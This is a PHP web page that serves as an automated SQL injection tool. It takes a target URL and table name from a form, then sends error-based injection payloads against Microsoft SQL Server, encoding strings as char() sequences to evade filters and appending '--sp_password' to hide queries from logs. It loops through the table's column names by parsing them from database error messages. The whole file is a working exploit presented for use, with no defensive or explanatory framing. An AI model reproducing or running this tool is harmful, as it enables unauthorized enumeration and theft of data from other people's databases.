<html> 
<meta http-equiv="content-type" content="text/html; charset=utf-8" />

<body>
<style type="text/css">
A:link { Font-family:Arial,Helvetica; size:13pt; color:blue; Text-Decoration:none }
A:visited { Font-size:13pt; color:blue; Text-Decoration:none }
A:active {Font-size:13pt; color:blue; Text-Decoration:none }
A:hover { Color:red; Text-Decoration:Underline }
body
{
	background-color: #000000;
}
body,td,th {
	color: #333333;
}
h2
{
	color: #FFCC00;
}
 </style>
 <body>
 <table width="80%" align="center" bgcolor="#ccffff" border="1">
    <tbody><tr>
	<td align="center">

<?php
ini_set ("max_execution_time","360000");

function convert($chuoi)
{
	$temp="char(";
	for ($i=0;$i<strlen($chuoi)-1;$i++)
	{
		$temp.=ord($chuoi[$i]).")%2bchar(";
	}
	$temp.=ord($chuoi[strlen($chuoi)-1]).")";
	return $temp;
}

class CURL 
{
	var $callback = false;

	function setCallback($func_name) 
	{
		$this->callback = $func_name;
	}

	function doRequest($method, $url, $vars) 
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		if ($method == 'POST') 
		{
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
		}
		$data = curl_exec($ch);
		curl_close($ch);
		if ($data) 
		{
			if ($this->callback)
			{
				$callback = $this->callback;
				$this->callback = false;
				return call_user_func($callback, $data);
			} 
			else 
			{
			return $data;
			}
		} 
		else
		{
		return curl_error($ch);
		}
	}

	function get($url) 
	{
		return $this->doRequest('GET', $url, 'NULL');
	}

	function post($url, $vars) 
	{
		return $this->doRequest('POST', $url, $vars);
	}
}

$cc = new CURL();
echo "<pre>";

$url_ori=$_POST["link"];
$table_value=$_POST["table_value"];
echo "<b>List of columns in table ".$table_value."</b><br>";
$table_value=convert($table_value);
$url=$url_ori."%20and%201=convert(int,(select%20top%201%20column_name%20from%20information_schema.columns%20where%20table_name=(".$table_value.")))--sp_password";
$dat = $cc->get("$url");
@eregi ("value '(.*)' to",$dat,$out);
$first_column=$out[1];
echo $first_column."\n";
$first_column=convert($first_column);
$url=$url_ori."%20and%201=convert(int,(select%20top%201%20column_name%20from%20information_schema.columns%20where%20table_name=(".$table_value.")%20and%20column_name%20not%20in%20(".$first_column.")))--sp_password";
$dat = $cc->get("$url");
@eregi ("value '(.*)' to",$dat,$out);
$xploited_column=$out[1];
echo $xploited_column."\n";
$xploited_column=convert($xploited_column);
$stop=false;
$url_new=$url_ori."%20and%201=convert(int,(select%20top%201%20column_name%20from%20information_schema.columns%20where%20table_name=(".$table_value.")%20and%20column_name%20not%20in%20(".$first_column;
while(!$stop)
{
	$url_new.=",".$xploited_column;
	$url=$url_new.")))--sp_password";
	$dat = $cc->get("$url");
	@eregi ("value '(.*)' to",$dat,$out);

	$xploited_column=$out[1];
	echo $xploited_column."\n";
	$xploited_column=convert($xploited_column);

	$url_check=$url_new.",".$xploited_column.")))--sp_password";
	$dat = $cc->get("$url_check");
	@eregi ("value '(.*)' to",$dat,$out);
	$check=$out[1];
	if (convert($check)==$xploited_column)
	{
		$stop=true;
	}

}
?>
 </td></tr>
  </tbody></table>
    
	
</body>
</html>